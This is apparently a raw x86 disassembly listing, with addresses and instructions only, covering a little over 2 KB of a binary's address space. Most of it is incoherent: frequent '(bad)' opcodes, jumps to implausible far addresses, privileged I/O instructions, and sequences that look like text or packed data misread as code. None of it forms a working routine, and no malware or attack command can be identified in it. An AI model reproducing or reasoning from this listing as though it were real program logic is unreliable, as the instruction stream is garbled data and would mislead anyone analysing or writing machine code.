  424be4:	dec    DWORD PTR [edi]
  424be6:	nop    DWORD PTR [ebp-0x37]
  424bea:	add    DWORD PTR [ebx+0x14a3d128],ebx
  424bf0:	loope  0x424b9a
  424bf2:	dec    esi
  424bf3:	xchg   esp,eax
  424bf4:	js     0x424bd4
  424bf6:	leave  
  424bf7:	sbb    BYTE PTR [esi-0x18],dh
  424bfa:	imul   ecx,DWORD PTR [esp+ecx*2-0x7f],0xffffffc9
  424bff:	(bad)  
  424c00:	xorps  xmm1,XMMWORD PTR [edx]
  424c03:	retf   0xda07
  424c06:	retf   0x9ee5
  424c09:	jno    0x424c40
  424c0b:	lahf   
  424c0c:	jmp    0x658f:0x3ba23307
  424c13:	xlat   BYTE PTR ds:[ebx]
  424c14:	dec    esi
  424c15:	outs   dx,BYTE PTR ds:[esi]
  424c16:	ins    DWORD PTR es:[edi],dx
  424c17:	sbb    eax,0x84cf9efb
  424c1c:	mov    ds:0x540f0f1a,al
  424c21:	jae    0x424c75
  424c23:	(bad)  
  424c24:	jl     0x51fae8
  424c2a:	dec    ecx
  424c2b:	or     al,cl
  424c2d:	inc    edx
  424c2e:	pop    edx
  424c2f:	stc    
  424c30:	jmp    0x424bf8
  424c32:	in     al,0xb9
  424c34:	test   BYTE PTR [ecx-0x7],al
  424c37:	mov    eax,0x87106a8
  424c3c:	stc    
  424c3d:	pop    eax
  424c3e:	std    
  424c3f:	mov    bh,0xfd
  424c41:	sub    eax,0xb000000
  424c46:	les    eax,FWORD PTR [eax]
  424c48:	add    bl,bh
  424c4a:	dec    ecx
	...
  424c57:	mov    bh,0xa9
  424c59:	retf   
  424c5a:	sub    al,0xa3
  424c5c:	dec    edi
  424c5d:	cmp    ebp,eax
  424c5f:	pusha  
  424c60:	into   
  424c61:	pop    DWORD PTR [edx+0x2b9658eb]
  424c67:	push   0x2e
  424c69:	stos   BYTE PTR es:[edi],al
  424c6a:	fcom   QWORD PTR [esi]
  424c6c:	fdivp  st(4),st
  424c6e:	cli    
  424c6f:	je     0x424ce5
  424c71:	je     0x424ce7
  424c73:	je     0x424ce9
  424c75:	je     0x424ceb
  424c77:	je     0x424c79
  424c79:	add    BYTE PTR [ebx+0x8ea325],ch
  424c7f:	add    BYTE PTR [edi],dl
  424c81:	mov    dl,0x32
  424c83:	push   es
  424c84:	nop
  424c85:	(bad)  
  424c86:	mov    BYTE PTR [esi],bl
  424c88:	dec    edx
  424c89:	cmp    edx,DWORD PTR [ebx-0x23800683]
  424c8f:	(bad)  
  424c90:	jecxz  0x424ccd
  424c92:	and    bh,BYTE PTR [ebx-0x47cfb52e]
  424c98:	inc    ecx
  424c99:	xchg   esp,eax
  424c9a:	mov    edi,0x1d06e7bb
  424c9f:	jno    0x424c6d
  424ca1:	mov    DWORD PTR [edi+0x720a7300],edi
  424ca7:	and    ah,BYTE PTR [ebx]
  424ca9:	and    BYTE PTR gs:[ebx+edx*2+0x3d],dh
  424cae:	and    ah,BYTE PTR [ecx+0x53]
  424cb1:	outs   dx,DWORD PTR ds:[esi]
  424cb2:	jns    0x424d26
  424cb4:	arpl   WORD PTR cs:[ecx+0x53],sp
  424cb8:	arpl   WORD PTR [ecx+0x57],bp
  424cbb:	imul   esi,DWORD PTR [ebp+0x3c],0x662e702c
  424cc2:	outs   dx,DWORD PTR ds:[esi]
  424cc3:	ins    DWORD PTR es:[edi],dx
  424cc4:	inc    ebx
  424cc5:	and    BYTE PTR [esi],ch
  424cc7:	ja     0x424d2e
  424cc9:	outs   dx,BYTE PTR ds:[esi]
  424cca:	and    BYTE PTR [ebx+0x20],ah
  424ccd:	ds inc esp
  424ccf:	outs   dx,BYTE PTR ds:[esi]
  424cd0:	popa   
  424cd1:	inc    sp
  424cd3:	push   ebx
  424cd4:	outs   dx,DWORD PTR ds:[esi]
  424cd5:	bound  ecx,QWORD PTR ds:0x20777672
  424cdb:	outs   dx,BYTE PTR ds:[esi]
  424cdc:	dec    ecx
  424cdd:	gs jb  0x424d55
  424ce0:	cs je  0x424d45
  424ce3:	outs   dx,DWORD PTR ds:[esi]
  424ce4:	push   ebx
  424ce5:	fs cmp eax,0x206d623c
  424ceb:	gs ins DWORD PTR es:[edi],dx
  424ced:	sub    BYTE PTR [ebx+0x63],dl
  424cf0:	data16 arpl WORD PTR [bp+di],sp
  424cf4:	ins    DWORD PTR es:[edi],dx
  424cf5:	outs   dx,DWORD PTR ds:[esi]
  424cf6:	ins    DWORD PTR es:[edi],dx
  424cf7:	jo     0x424d5e
  424cf9:	jae    0x424d60
  424cfb:	bound  esi,QWORD PTR gs:[edx+0x20]
  424cff:	or     ax,0x7020
  424d03:	or     dh,BYTE PTR [bp+di+0x65]
  424d07:	cs ins DWORD PTR es:[edi],dx
  424d09:	and    BYTE PTR [edi],ch
  424d0b:	and    BYTE PTR [esi+0x69],dh
  424d0e:	and    BYTE PTR [edx+0x3c],dh
  424d11:	gs cs je 0x424d82
  424d15:	cmp    al,0x6d
  424d17:	ins    DWORD PTR es:[edi],dx
  424d18:	sub    DWORD PTR gs:[esi+0x6d],ebp
  424d1c:	jb     0x424d8e
  424d1e:	imul   edi,DWORD PTR [esi],0x7f400020
  424d24:	add    BYTE PTR [eax],al
  424d26:	jno    0x424cb6
  424d28:	sub    al,BYTE PTR [eax]
  424d2a:	add    BYTE PTR [ecx+eiz*2-0x1ae606d3],ch
  424d31:	mov    al,ds:0xdf0236b6
  424d36:	scas   al,BYTE PTR es:[edi]
  424d37:	or     BYTE PTR [ecx],bl
  424d39:	int    0x99
  424d3b:	xor    DWORD PTR [edi*8+0x60adb8d2],ebx
  424d42:	push   eax
  424d43:	add    BYTE PTR [eax],al
  424d45:	add    BYTE PTR [ebp+0x70],bl
  424d48:	call   0x7c4cf99c
  424d4d:	ss push ecx
  424d4f:	push   ecx
  424d50:	fld    QWORD PTR [ecx+0x53]
  424d53:	fdivr  DWORD PTR [ebx]
  424d55:	retf   0x204
  424d58:	fwait
  424d59:	arpl   WORD PTR [esi*2-0x75570abb],cx
  424d60:	repz sbb al,0x8c
  424d63:	add    BYTE PTR [eax],al
  424d65:	mov    al,ds:0xea89
  424d6a:	add    al,ch
  424d6c:	call   0xe92b3659
  424d71:	call   0xa9d1365e
  424d76:	ja     0x424d03
  424d78:	mov    ecx,DWORD PTR [ebx-0x74747475]
  424d7e:	mov    ecx,DWORD PTR [ebx+0x39420000]
  424d84:	jne    0x424dd1
  424d86:	mov    eax,ds:0x239560d4
  424d8b:	push   ebx
  424d8c:	test   BYTE PTR [ebp+0x148f78bd],0x94
  424d93:	jo     0x424d36
  424d95:	neg    dl
  424d97:	cld    
  424d98:	ret    
  424d99:	add    BYTE PTR [eax],0x0
  424d9c:	jle    0x424d91
  424d9e:	add    BYTE PTR [eax],al
  424da0:	call   0xfc70:0x4d00006a
  424da7:	fist   WORD PTR [ebx]
  424da9:	push   ds
  424daa:	test   al,0x90
  424dac:	adc    esp,esp
  424dae:	mov    ebx,0xb4bd413e
  424db3:	mov    edx,0xaaa729c7
  424db8:	sbb    eax,0xd9cd20
  424dbd:	inc    DWORD PTR [ecx-0x30]
  424dc0:	lea    ebx,[ecx]
  424dc2:	(bad)  
  424dc3:	(bad)  
  424dc4:	(bad)  
  424dc5:	jns    0x424dad
  424dc7:	jecxz  0x424e30
  424dc9:	out    dx,eax
  424dca:	popf   
  424dcb:	loop   0x424e40
  424dcd:	jae    0x424e4b
  424dcf:	lods   al,BYTE PTR ds:[esi]
  424dd0:	rol    DWORD PTR [esi+0x317f6f7a],cl
  424dd6:	pop    ebp
  424dd7:	jmp    0xbe896430
  424ddc:	add    esi,DWORD PTR [esi+eax*1+0x63]
  424de0:	stos   DWORD PTR es:[edi],eax
  424de1:	jbe    0x424e1a
  424de3:	mov    DWORD PTR [eax-0xd6c297],edi
  424de9:	jmp    DWORD PTR [edi-0x3f]
  424def:	push   0x6a
  424df1:	push   0x6a
  424df3:	push   0x6a
  424df5:	push   0x6a
  424df7:	push   0xfffffffd
  424df9:	push   ebp
  424dfa:	xchg   BYTE PTR [eax],al
	...
  424e04:	jne    0x424e7b
  424e06:	in     eax,0xa6
  424e08:	popf   
  424e09:	jns    0x424dec
  424e0b:	test   DWORD PTR [edx],0x4ad5b4da
  424e11:	mov    esi,0x7ba3287d
  424e16:	pop    ds
  424e17:	into   
  424e18:	enter  0x5759,0xdc
  424e1c:	imul   ebp,DWORD PTR ds:0x6ee57575,0x31
  424e23:	lods   al,BYTE PTR ds:[esi]
  424e24:	imul   esi,DWORD PTR [edi],0xb5aeae5c
  424e2a:	pusha  
  424e2b:	inc    ebx
  424e2c:	xchg   edx,eax
  424e2d:	pop    edx
  424e2e:	retf   
  424e2f:	adc    al,0x72
  424e31:	and    eax,0xed7b5c9
  424e36:	enter  0x5335,0xeb
  424e3a:	jnp    0x424e0c
  424e3c:	fbstp  TBYTE PTR [ebp+0x75]
  424e3f:	int    0x1c
  424e41:	ret    0x7575
  424e44:	repnz and DWORD PTR [ebp+0x4fae0075],0xcef15313
  424e4f:	into   
  424e50:	out    dx,al
  424e51:	sub    dh,dl
  424e53:	rcr    BYTE PTR [edi-0x1e],0xd8
  424e57:	dec    ecx
  424e58:	sub    dl,BYTE PTR [ebx-0x407c551c]
  424e5e:	dec    edi
  424e5f:	dec    edx
  424e60:	sub    DWORD PTR [eax],eax
  424e62:	add    BYTE PTR [eax],al
  424e64:	pop    esi
  424e65:	and    al,0x0
  424e67:	add    BYTE PTR [edx+ebp*8-0x1000000],ah
  424e6e:	(bad)  
  424e6f:	(bad)  
  424e70:	(bad)  
  424e71:	(bad)  
  424e72:	(bad)  
  424e73:	(bad)  
  424e74:	(bad)  
  424e75:	push   DWORD PTR [ebp+0x5d]
  424e78:	ds into 
  424e7a:	add    DWORD PTR [ebp-0x7],0x29e8ce1b
  424e81:	js     0x424e56
  424e83:	mov    cl,0x5c
  424e85:	fistp  DWORD PTR [edx-0x29]
  424e88:	mov    dh,0x38
  424e8a:	repnz or eax,edx
  424e8d:	enter  0x0,0x0
  424e91:	add    BYTE PTR [eax],al
  424e93:	add    BYTE PTR [eax],al
  424e95:	add    BYTE PTR [eax],al
  424e97:	(bad)  
  424e98:	(bad)  
  424e99:	mov    eax,0xffb9cb91
  424e9e:	dec    esi
  424ea0:	lock and DWORD PTR [edi+0x4d],ecx
  424ea4:	in     eax,0xed
  424ea6:	mov    BYTE PTR [ecx+0x6e],bl
  424ea9:	xchg   edi,eax
  424eaa:	jns    0x424f0a
  424eac:	enter  0x87e8,0x80
  424eb0:	std    
  424eb1:	leave  
  424eb2:	out    0x6d,eax
  424eb4:	push   edx
  424eb5:	pop    esp
  424eb6:	jge    0x424e43
  424eb8:	popa   
  424eb9:	retf   
  424eba:	fld    DWORD PTR [ebx]
  424ebc:	test   eax,0x7c29b9ca
  424ec1:	push   esi
  424ec2:	(bad)  
  424ec3:	(bad)  
  424ec4:	fild   DWORD PTR [ebp+0x34c4ffff]
  424eca:	int    0xff
  424ecc:	dec    DWORD PTR [edi]
  424ece:	je     0x424ea6
  424ed0:	std    
  424ed1:	mov    ?,WORD PTR [edi+0x1ea9481f]
  424ed7:	stos   DWORD PTR es:[edi],eax
  424ed8:	or     BYTE PTR [ebp+0x69902bc5],dl
  424ede:	adc    al,0x58
  424ee0:	ret    
  424ee1:	sbb    esp,0x7f
  424ee4:	sbb    edi,edi
  424ee6:	(bad)  
  424ee7:	(bad)  
  424ee8:	mov    ebp,0xc0ff330f
  424eed:	ds pop ebp
  424eef:	out    dx,eax
  424ef0:	mov    cs,WORD PTR [esp+eax*8+0x6b]
  424ef4:	jb     0x424eb7
  424ef6:	pop    ss
  424ef7:	lea    ebx,[ebp-0x32]
  424efa:	mov    ds:0x536e160a,eax
  424eff:	pushf  
  424f00:	sbb    BYTE PTR [ecx-0x44],dl
  424f03:	jmp    DWORD PTR [ebx]
  424f05:	(bad)  
  424f06:	dec    DWORD PTR [esi+edi*8]
  424f09:	and    al,0xff
  424f0b:	(bad)  
  424f0c:	inc    DWORD PTR [eax]
	...
  424f16:	dec    edx
  424f17:	adc    ebx,esi
	...
  424f21:	add    BYTE PTR [eax+0x50],dl
  424f24:	inc    ebp
  424f25:	cmp    DWORD PTR [eax+0x42e59e5b],0x30
  424f2c:	dec    eax
  424f2d:	jp     0x424f65
  424f2f:	pop    ecx
  424f30:	pushf  
  424f31:	fwait
  424f32:	and    esi,DWORD PTR [ebx-0x3ea65f76]
  424f38:	call   0x504eafb5
  424f3d:	push   eax
  424f3e:	popa   
  424f3f:	mov    dl,BYTE PTR [eax+0x50]
  424f42:	sbb    bh,0x50
  424f45:	push   eax
  424f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f47:	push   esi
  424f48:	js     0x424f9f
  424f4a:	ins    BYTE PTR es:[edi],dx
  424f4b:	imul   ebx,ebp,0x177a8f82
  424f51:	adc    BYTE PTR [ebx-0x42],al
  424f54:	aaa    
  424f55:	ds (bad) 
  424f57:	sahf   
  424f58:	les    ebp,FWORD PTR [edx+0x5e2b5c0e]
  424f5e:	push   eax
  424f5f:	call   0xf365bc1
  424f64:	call   0x66693851
  424f69:	loop   0x424f64
  424f6b:	les    ecx,FWORD PTR [esp+ebp*4+0x626dd46e]
  424f72:	push   ds
  424f73:	sub    eax,0x37d5eb0b
  424f78:	in     al,dx
  424f79:	push   0x79c7d3e4
  424f7e:	push   ebx
  424f7f:	add    esp,DWORD PTR [edi+0x4e]
  424f82:	(bad)  
  424f83:	dec    esp
  424f84:	mov    eax,ds:0x206b7f5a
  424f89:	push   esp
  424f8a:	call   0xe89ab677
  424f8f:	call   0xe92b387c
  424f94:	call   0xe92b3881
  424f99:	call   0xff97f784
  424f9e:	(bad)  
  424f9f:	(bad)  
  424fa0:	(bad)  
  424fa1:	(bad)  
  424fa2:	(bad)  
  424fa3:	(bad)  
  424fa4:	(bad)  
  424fa5:	inc    DWORD PTR [eax]
  424fa7:	add    BYTE PTR [ecx-0x4],dl
  424faa:	hlt    
  424fab:	nop
  424fac:	sbb    esp,DWORD PTR [ebp+edx*2+0x78e28dbb]
  424fb3:	and    al,0x1f
  424fb5:	xchg   DWORD PTR [ebp+0x46e3bcad],esi
  424fbb:	dec    ebx
  424fbc:	inc    edi
  424fbd:	cwde   
  424fbe:	push   es
  424fbf:	sti    
  424fc0:	add    BYTE PTR [eax],al
  424fc2:	out    0xb2,eax
  424fc4:	sub    eax,0x69815e70
  424fc9:	dec    eax
  424fca:	mov    cl,0xc6
  424fcc:	lds    ebp,FWORD PTR [eax]
  424fce:	sub    eax,0xbf994b45
  424fd3:	xchg   edi,eax
  424fd4:	pop    esp
  424fd5:	cdq    
  424fd6:	cmp    eax,0xcd3d3367
  424fdb:	mov    al,ds:0xf7d07a
  424fe0:	add    BYTE PTR ds:0x7e70,dl
  424fe6:	mov    WORD PTR ds:0xd000020,?
  424fec:	adc    al,0x1b
  424fee:	lods   al,BYTE PTR ds:[si]
  424ff0:	aam    0xb5
  424ff2:	xchg   esi,eax
  424ff3:	sahf   
  424ff4:	push   ebx
  424ff5:	les    ebp,FWORD PTR [ecx]
  424ff7:	shl    DWORD PTR [eax],cl
  424ff9:	fcomp  QWORD PTR [esi-0x2f]
  424ffc:	dec    esi
  424ffd:	stos   BYTE PTR es:[edi],al
  424ffe:	(bad)  
  424fff:	leave  
  425000:	add    al,0xfc
  425002:	inc    edx
  425003:	add    BYTE PTR [eax],al
  425005:	add    BYTE PTR [eax],cl
  425007:	xchg   edi,eax
  425008:	add    BYTE PTR [eax],al
  42500a:	sahf   
  42500b:	retf   0x0
	...
  425016:	add    BYTE PTR [eax],al
  425018:	mov    esp,0xe4fad9c
  42501d:	into   
  42501e:	inc    edx
  42501f:	xor    al,0xbd
  425021:	mov    cl,0x40
  425023:	fmul   st(5),st
  425025:	test   BYTE PTR [eax],ch
  425027:	push   ebp
  425028:	jae    0x425011
  42502a:	leave  
  42502b:	xor    al,0xd0
  42502d:	mov    ebx,0xffff2434
  425032:	(bad)  
  425033:	(bad)  
  425034:	(bad)  
  425035:	(bad)  
  425036:	(bad)  
  425037:	(bad)  
  425038:	(bad)  
  425039:	(bad)  
  42503a:	(bad)  
  42503b:	jmp    0xffe7c3df
  425040:	(bad)  
  425041:	out    dx,eax
  425042:	jmp    0xf04e:0x2794fec2
  425049:	aam    0xae
  42504b:	mov    ch,0x82
  42504d:	mov    esp,esi
  42504f:	aam    0x3b
  425051:	lods   eax,DWORD PTR ds:[esi]
  425052:	jp     0x42502b
  425054:	(bad)  
  425055:	lahf   
  425056:	rol    BYTE PTR [esi-0x514bf458],0x28
  42505d:	fsub   st(5),st
  42505f:	ins    BYTE PTR es:[edi],dx
  425060:	mov    bh,0xca
  425062:	mov    ecx,ebp
  425064:	(bad)  
  425065:	inc    DWORD PTR [eax]
  425067:	xor    al,0xff
  425069:	jmp    FWORD PTR [ebp+0x4c]
  42506c:	xor    al,0xff
  42506e:	mov    ebx,DWORD PTR [esi+0x4fd3f252]
  425074:	adc    ah,BYTE PTR [ebx-0x52be8a26]
  42507a:	push   eax
  42507b:	cwde   
  42507c:	or     eax,0x3870fe1e
  425081:	pop    eax
  425082:	leave  
  425083:	fcomip st,st(3)
  425085:	stos   BYTE PTR es:[edi],al
  425086:	pop    eax
  425087:	mov    ecx,DWORD PTR [ebx-0x5b6b0475]
  42508d:	and    DWORD PTR [ecx],0xcca9bcb6
  425093:	push   edx
  425094:	ret    
  425095:	pop    ebp
  425096:	mov    ebx,0x27ba02f
  42509b:	dec    ebx
  42509c:	aad    0xd3
  42509e:	test   al,0xd5
  4250a0:	addr16 jmp 0x425039
  4250a3:	inc    ebx
  4250a4:	push   edi
  4250a5:	add    BYTE PTR [ecx-0x75],0x8b
  4250a9:	in     al,dx
  4250aa:	pop    es
  4250ab:	jg     0x425038
  4250ad:	mov    ecx,DWORD PTR [ebx+0xc0c0c0c]
  4250b3:	or     al,0xc
  4250b5:	or     al,0xc
  4250b7:	or     al,0xf2
  4250b9:	fsubr  QWORD PTR [ebp-0x1]
  4250bf:	(bad)  
  4250c0:	(bad)  
  4250c1:	(bad)  
  4250c2:	(bad)  
  4250c3:	(bad)  
  4250c4:	(bad)  
  4250c5:	(bad)  
  4250c6:	cmp    esp,DWORD PTR [eax+0x65]
  4250c9:	ins    DWORD PTR es:[edi],dx
  4250ca:	push   ebx
  4250cb:	inc    esp
  4250cc:	je     0x42512f
  4250ce:	jne    0x425142
  4250d0:	ins    DWORD PTR es:[edi],dx
  4250d1:	ins    DWORD PTR es:[edi],dx
  4250d2:	jb     0x425143
  4250d4:	jae    0x42513b
  4250d6:	jb     0x42511b
  4250d8:	outs   dx,BYTE PTR ds:[esi]
  4250d9:	dec    ebp
  4250da:	ins    DWORD PTR es:[edi],dx
  4250db:	and    BYTE PTR [edx+0x72],dh
  4250de:	jb     0x42511d
  4250e0:	jb     0x425135
  4250e2:	cmp    eax,0x6f657373
  4250e7:	jb     0x42515d
  4250e9:	outs   dx,DWORD PTR ds:[esi]
  4250ea:	push   ebx
  4250eb:	imul   esi,DWORD PTR [edx+0x20],0x692e2266
  4250f2:	gs arpl WORD PTR ds:[edx],di
  4250f6:	and    dh,BYTE PTR [edx+0x44]
  4250f9:	jae    0x42511b
  4250fb:	arpl   WORD PTR cs:[edi+ebp*2+0x20],bp
  425100:	jae    0x425174
  425102:	outs   dx,DWORD PTR ds:[si]
  425104:	jae    0x42516b
  425106:	and    BYTE PTR [ebp+0x63],cl
  425109:	jae    0x42516d
  42510b:	outs   dx,DWORD PTR ds:[esi]
  42510c:	bound  ecx,QWORD PTR [ebp+0x20]
  42510f:	cs inc edi
  425111:	fimul  WORD PTR [ebp+0x12]
  425114:	xor    bl,BYTE PTR [edi-0x48]
  425117:	and    esi,esi
  425119:	data16 sti 
  42511b:	jecxz  0x42513d
  42511d:	push   esi
  42511e:	cmc    
  42511f:	or     ebx,DWORD PTR [edx-0x47]
  425122:	stc    
  425123:	and    bh,BYTE PTR [ebx-0x1b]
  425126:	(bad)  
  425127:	dec    edi
  425129:	pop    esp
  42512a:	(bad)  
  42512b:	call   DWORD PTR [ebx-0x5c]
  42512e:	(bad)  
  42512f:	push   DWORD PTR [esi-0x57fda86f]
  425135:	adc    DWORD PTR [edi+0x67e73287],esp
  42513b:	fptan  
  42513d:	cdq    
  42513e:	push   ss
  42513f:	in     al,dx
  425140:	fwait
  425141:	and    ebp,edi
  425143:	adc    ebx,esp
  425145:	adc    DWORD PTR [esi],0xffffffa3
  425148:	inc    DWORD PTR [eax]
  42514a:	pop    eax
  42514b:	and    edx,DWORD PTR [edx+edx*1-0x2c000000]
  425152:	add    ah,BYTE PTR [esi+0x39]
  425155:	push   cs
  425156:	jle    0x425196
  425158:	leave  
  425159:	retf   0x4e43
  42515c:	cmp    ebp,DWORD PTR ds:0x5342259
  425162:	and    al,0x44
  425164:	fs pop edi
  425166:	adc    esp,edx
  425168:	pop    ebx
  425169:	fwait
  42516a:	mov    bl,0xa8
  42516c:	lea    esp,[edx+0x7d18a7aa]
  425172:	mov    BYTE PTR [ebp-0x35230000],al
	...
  425184:	pop    ebp
  425185:	in     eax,dx
  425186:	add    BYTE PTR ss:[eax],al
	...
  425191:	add    BYTE PTR [eax-0x192d09b2],cl
  425197:	into   
  425198:	cmc    
  425199:	inc    esp
  42519a:	inc    ebp
  42519b:	mov    BYTE PTR [esi+0x66c48d78],dh
  4251a1:	test   ebp,eax
  4251a3:	ja     0x42512e
  4251a5:	ds or  ecx,eax
  4251a8:	mov    ds:0xe6000067,eax
  4251ad:	mov    ah,0x6c
  4251af:	jle    0x42519d
  4251b1:	and    esi,DWORD PTR [ecx]
  4251b3:	jp     0x4251d4
  4251b5:	addr16 loopne 0x4251ff
  4251b8:	addr16 push esp
  4251ba:	sbb    ah,dl
  4251bc:	scas   al,BYTE PTR es:[edi]
  4251bd:	js     0x4251bd
  4251bf:	sub    cl,BYTE PTR [edx+0x4907bf1c]
  4251c5:	mov    esi,0x7f318
  4251ca:	add    al,cl
  4251cc:	mov    ebx,0xfe000056
  4251d1:	movq   QWORD PTR [eax],mm0
  4251d4:	add    BYTE PTR [esi],dl
  4251d6:	sub    eax,0xbd935297
  4251db:	fcom   DWORD PTR [esi]
  4251dd:	sbb    DWORD PTR [edi-0x77],esi
  4251e0:	dec    ebx
  4251e1:	push   eax
  4251e2:	push   esp
  4251e3:	enterw 0x922c,0x53
  4251e8:	ss dec ecx
  4251ea:	lods   eax,DWORD PTR ds:[esi]
  4251eb:	ret    0xc4
  4251ee:	add    BYTE PTR [eax],al
  4251f0:	lods   al,BYTE PTR ds:[esi]
  4251f1:	add    BYTE PTR gs:[eax],al
  4251f4:	out    dx,eax
  4251f5:	test   eax,0xff000000
  4251fa:	(bad)  
  4251fb:	(bad)  
  4251fc:	(bad)  
  4251fd:	(bad)  
  4251fe:	(bad)  
  4251ff:	(bad)  
  425200:	(bad)  
  425201:	jmp    DWORD PTR [ebx+ebx*8+0x28]
  425205:	fcomp  QWORD PTR [edi]
  425207:	dec    ebx
  425208:	xchg   ecx,eax
  425209:	lods   al,BYTE PTR ds:[esi]
  42520a:	xor    eax,0x61e1774b
  42520f:	dec    edi
  425210:	lock xchg ecx,eax
  425212:	cwde   
  425213:	aam    0xaf
  425215:	mov    cs,WORD PTR [esi+0xf9a361]
	...
  425223:	add    BYTE PTR [eax],al
  425225:	pop    edi
  425226:	pop    ecx
  425227:	dec    ebp
  425228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425229:	add    BYTE PTR [eax],al
  42522b:	adc    eax,0x6ea74251
  425230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425231:	inc    edi
  425232:	icebp  
  425233:	mov    dl,0xde
  425235:	ss inc edi
  425237:	pop    ecx
  425238:	cdq    
  425239:	mov    ds:0x6760c0ca,eax
  42523e:	or     BYTE PTR [eax],dh
  425240:	jmp    0x780d4a3d
  425245:	inc    eax
  425246:	or     ch,BYTE PTR [ebx-0x710d655f]
  42524c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42524d:	xchg   edi,eax
  42524e:	add    BYTE PTR [eax],al
  425250:	sti    
  425251:	sub    eax,0x6eff0000
  425256:	imul   eax,DWORD PTR [eax],0xc
  425259:	mov    ecx,0xb2d9f551
  42525e:	stc    
  42525f:	adc    ebp,ecx
  425261:	inc    eax
  425262:	popf   
  425263:	and    ch,BYTE PTR [edx+0x2f67d353]
  425269:	mov    ds:0x6314ba47,eax
  42526e:	mov    dl,0x18
  425270:	cli    
  425271:	or     al,0xc
  425273:	or     al,0x66
  425275:	mov    ?,edx
  425277:	jb     0x4252b8
  425279:	add    eax,0x689dff87
  42527e:	or     eax,0x3c404ad4
  425283:	or     ch,BYTE PTR [esi-0x13]
  425286:	imul   BYTE PTR [esi]
  425288:	lock push ebp
  42528a:	add    al,BYTE PTR [edi+0x2f]
  42528d:	ret    0x2bf1
  425290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425291:	or     al,0xc
  425293:	in     eax,dx
  425294:	adc    dl,BYTE PTR [edi+0xc0c0c]
	...
  4252a2:	jmp    0x4252f0
  4252a4:	dec    eax
  4252a5:	or     al,0xc
  4252a7:	or     al,0xc
  4252a9:	or     al,0xc
  4252ab:	or     al,0xc
  4252ad:	or     al,0x0
  4252af:	add    bh,dh
  4252b1:	cmc    
  4252b2:	jle    0x425247
  4252b4:	and    eax,0x8348c82a
  4252b9:	push   ds
  4252ba:	xchg   DWORD PTR [edx+0x4d],edi
  4252bd:	inc    esp
  4252be:	inc    ecx
  4252bf:	lods   eax,DWORD PTR ds:[esi]
  4252c0:	test   BYTE PTR [eax+ebx*8+0x20],ah
  4252c4:	loop   0x425286
  4252c6:	pop    ecx
  4252c7:	or     eax,DWORD PTR [eax]
  4252c9:	add    BYTE PTR [edi],al
  4252cb:	mov    BYTE PTR [eax],0x0
  4252ce:	dec    edi
  4252cf:	add    DWORD PTR [eax],0x6dec1500
  4252d5:	and    DWORD PTR [esi],edi
  4252d7:	test   eax,0x64361d30
  4252dc:	call   FWORD PTR [ebp-0x21]
  4252df:	mov    dl,0x23
  4252e1:	pop    edi
  4252e2:	and    DWORD PTR [ebp-0x5d],eax
  4252e5:	push   edx
  4252e6:	in     al,0xda
  4252e8:	lods   al,BYTE PTR ds:[esi]
  4252e9:	push   eax
  4252ea:	add    BYTE PTR [eax],al
  4252ec:	pop    ebp
  4252ed:	dec    edi
  4252ee:	pop    edi
  4252ef:	icebp  
  4252f0:	add    BYTE PTR [eax],al
  4252f2:	add    BYTE PTR [edi+0x34],bl
  4252f5:	and    al,0xa0
  4252f7:	imul   esi,edi,0x5e
  4252fa:	xor    DWORD PTR [ebx+0x64],edx
  4252fd:	cli    
  4252fe:	scas   eax,DWORD PTR es:[edi]
  4252ff:	mov    ebx,0x52f1138
  425304:	test   eax,0x6ad8aed6
  425309:	leave  
  42530a:	xor    al,0xc5
  42530c:	js     0x42537e
  42530e:	dec    ecx
  42530f:	ds in  eax,0x38
  425312:	jle    0x4252cc
  425314:	jge    0x42530c
  425316:	add    BYTE PTR [eax],al
  425318:	mov    bh,0x19
	...
  425322:	add    BYTE PTR [edi+0x6d],ah
  425325:	and    dh,BYTE PTR [edx+0x73]
  425328:	bound  eax,QWORD PTR [ebx+0x52]
  42532b:	and    BYTE PTR [esi],ch
  42532d:	or     eax,0x7275732e
  425332:	jns    0x425384
  425334:	and    dh,BYTE PTR [edx+0x6e]
  425337:	gs inc esp
  425339:	sub    DWORD PTR [ebp+0x6d],esp
  42533c:	imul   edx,DWORD PTR gs:[edi+0x6c],0x20736176
  425344:	jb     0x4253ab
  425346:	bound  edx,QWORD PTR [edi+0x20]
  425349:	outs   dx,DWORD PTR ds:[esi]
  42534a:	sub    BYTE PTR [ebp+0x20],ch
  42534d:	and    BYTE PTR [ebp+0x78],ch
  425350:	outs   dx,BYTE PTR ds:[esi]
  425351:	bound  ebp,QWORD PTR [ecx]
  425353:	push   edi
  425354:	and    BYTE PTR [ebp+0x6d],ah
  425357:	pop    ebp
  425358:	jns    0x42539b
  42535a:	je     0x4253d5
  42535c:	and    BYTE PTR [edx],cl
  42535e:	arpl   WORD PTR [ebx+0x6e],si
  425361:	jae    0x4253c4
  425363:	imul   ecx,DWORD PTR [ebp+0x65],0x2062202e
  42536a:	data16 gs jb 0x42536e
  42536e:	add    BYTE PTR [eax],al
  425370:	xchg   edi,eax
  425371:	lods   eax,DWORD PTR ds:[esi]
  425372:	cmp    esi,DWORD PTR [esp+esi*2+0x74]
  425376:	je     0x4253ec
  425378:	je     0x4253ee
  42537a:	je     0x4253f0
  42537c:	or     al,0xc
  42537e:	mov    bl,0xc1
  425380:	fldl2e 
  425382:	out    0x3,al
  425384:	out    dx,eax
  425385:	scas   al,BYTE PTR es:[edi]
  425386:	es xchg esi,eax
  425388:	(bad)  
  425389:	cmp    ecx,DWORD PTR [edi-0x36a087cd]
  42538f:	dec    eax
  425390:	mov    BYTE PTR [edx],dh
  425392:	sub    DWORD PTR [ecx+edx*8+0x3a0c0c99],ebx
  425399:	jl     0x425356
  42539b:	cs mov dl,0x6d
  42539e:	stos   DWORD PTR es:[edi],eax
  42539f:	jmp    0xd773:0x8f1b6a71
  4253a6:	cmp    eax,0x21d888a9
  4253ab:	add    BYTE PTR [edx-0x42],cl
  4253ae:	push   0xd1b49506
  4253b3:	stc    
  4253b4:	cmp    BYTE PTR [esp+ecx*1],cl
  4253b7:	dec    eax
  4253b8:	inc    esi
  4253b9:	inc    edx
  4253ba:	or     al,0xc
  4253bc:	add    DWORD PTR [edx+esi*4+0xc],edi
  4253c0:	mov    esp,DWORD PTR ds:0xa168e890
  4253c6:	out    dx,eax
